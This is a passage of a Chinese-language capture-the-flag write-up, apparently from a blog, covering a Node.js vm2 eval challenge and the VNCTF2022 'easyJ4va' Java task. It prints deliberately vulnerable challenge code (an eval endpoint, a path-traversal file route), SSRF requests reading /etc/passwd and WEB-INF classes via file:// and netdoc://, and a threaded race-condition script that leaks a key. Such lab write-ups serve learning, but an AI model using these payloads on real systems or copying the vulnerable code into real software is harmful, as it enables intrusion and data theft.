+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm2<span class="token punctuation">.</span>NodeVM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/eval"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> e <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"module.exports="</span><span class="token operator">+</span>e<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>k <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">delete</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> p <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>path <span class="token operator">||</span> <span class="token string">"/src/index.js"</span><span class="token punctuation">;</span>
+  p <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
+  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>PORT <span class="token operator">||</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>分析</p>
+<pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>k <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">delete</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>猜测是要利用原链型污染更改.prototype，不过我自己没有想出来payload，对原链型污染的理解还不够深，希望之后找几道习题练一练<br>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/l0nmar/p/13951739.html">https://www.cnblogs.com/l0nmar/p/13951739.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto</a>__<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2802">https://xz.aliyun.com/t/2802</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2735">https://xz.aliyun.com/t/2735</a></p>
+<h2 id="easyJ4va"><a href="#easyJ4va" class="headerlink" title="easyJ4va"></a>easyJ4va</h2><h3 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="jd-gui反编译-class文件"><a href="#jd-gui反编译-class文件" class="headerlink" title="jd-gui反编译.class文件"></a>jd-gui反编译.class文件</h4><p><a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui/releases">下载地址</a><br>命令行调用图形化界面，正常使用。</p>
+<pre class=" language-1"><code class="language-1">java -jar jd-jui-1.6.6.jar
+</code></pre>
+<h4 id="tomact目录"><a href="#tomact目录" class="headerlink" title="tomact目录"></a>tomact目录</h4><p><a target="_blank" rel="noopener" href="https://riptutorial.com/tomcat/example/20892/directory-structure-in-ubuntu--linux-">tomcat目录结构</a></p>
+<h4 id="java基础语法"><a href="#java基础语法" class="headerlink" title="java基础语法"></a>java基础语法</h4><p>之后填坑</p>
+<h3 id="题目详解-2"><a href="#题目详解-2" class="headerlink" title="题目详解"></a>题目详解</h3><p>打开题目F12提示/file?，访问/file，提示要输入url，用file协议读取/etc/passwd</p>
+<pre class=" language-1"><code class="language-1">/file?url=file:///etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+tomcat:x:1000:1000::/home/tomcat:/bin/sh
+</code></pre>
+<p>构造（WEB-INF文件官方目录里并没有，但访问ROOT之后可以找到。还有不知道官方WP中为什么用netdoc，我复现时用file起到一样的效果）</p>
+<pre class=" language-1"><code class="language-1">/file?url=netdoc:///usr/local/tomcat/webapps/ROOT/WEB-INF/classes
+</code></pre>
+<p>将其中的.classes文件全部下载。用jd-gui反编译。<br>在HelloWorldServlet.class文件中有</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+    String key <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    String text <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> text <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      Base64<span class="token punctuation">.</span>Decoder decoder <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> textByte <span class="token operator">=</span> decoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      User u <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>SerAndDe<span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>textByte<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"DeserializeFlag is "</span> <span class="token operator">+</span> Secr3t<span class="token punctuation">.</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"KeyError"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>
+</code></pre>
+<p>也就是说我们要得到Secr3t.getKey的值以及useru的反序列化</p>
+<pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"HelloServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/evi1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorldServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>
+  <span class="token keyword">private</span> <span class="token keyword">volatile</span> String name <span class="token operator">=</span> <span class="token string">"m4n_q1u_666"</span><span class="token punctuation">;</span>
+  
+  <span class="token keyword">private</span> <span class="token keyword">volatile</span> String age <span class="token operator">=</span> <span class="token string">"666"</span><span class="token punctuation">;</span>
+  
+  <span class="token keyword">private</span> <span class="token keyword">volatile</span> String height <span class="token operator">=</span> <span class="token string">"180"</span><span class="token punctuation">;</span>
+  
+  User user<span class="token punctuation">;</span>
+  
+  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span>HttpServletRequest req<span class="token punctuation">,</span> HttpServletResponse resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
+    String reqName <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>reqName <span class="token operator">!=</span> null<span class="token punctuation">)</span>
+      <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> reqName<span class="token punctuation">;</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"no vnctf2022!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>Secr3t<span class="token punctuation">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token function">Response</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span> <span class="token string">"The Key is "</span> <span class="token operator">+</span> Secr3t<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+  <span class="token punctuation">}</span>
+</code></pre>
+<p>doGet⾥有如下判断，其中有Secr3t判断发现是⽭盾的。需要竞争绕过第⼀个check，并且达到第⼆个check。<br>找到Sect3t.check代码</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">check</span><span class="token punctuation">(</span>String checkStr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"vnctf2022"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>checkStr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>判断是否含有vnctf2022，需要一个不正确的内容绕过第一个check，然后正确的内容去第二个check。写脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> sys
+url<span class="token operator">=</span><span class="token string">"http://c83209e6-0cdb-4b6c-a822-22faa8342566.node4.buuoj.cn:81/evi1"</span>
+url1<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?name=vnctf2022"</span>
+url2<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?name=wrong"</span>
+event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"The Key is"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>run<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>回显：The Key is RGTV8gSETE6LKgj5sq6KKSbuV3nouWdG<br>最后是反序列化，原代码如下</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> entity<span class="token punctuation">.</span>User<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
+  <span class="token keyword">private</span> String name<span class="token punctuation">;</span>
+  
+  <span class="token keyword">private</span> String age<span class="token punctuation">;</span>
+  
+  <span class="token keyword">private</span> <span class="token keyword">transient</span> String height<span class="token punctuation">;</span>
+  
+  <span class="token keyword">public</span> <span class="token function">User</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> String age<span class="token punctuation">,</span> String height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> String <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span>String age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> String <span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHeight</span><span class="token punctuation">(</span>String height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream s<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> null<span class="token punctuation">)</span>
+      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> obj<span class="token punctuation">)</span>
+      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">User</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      User user <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>obj<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> user<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> 
+      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  
+  <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
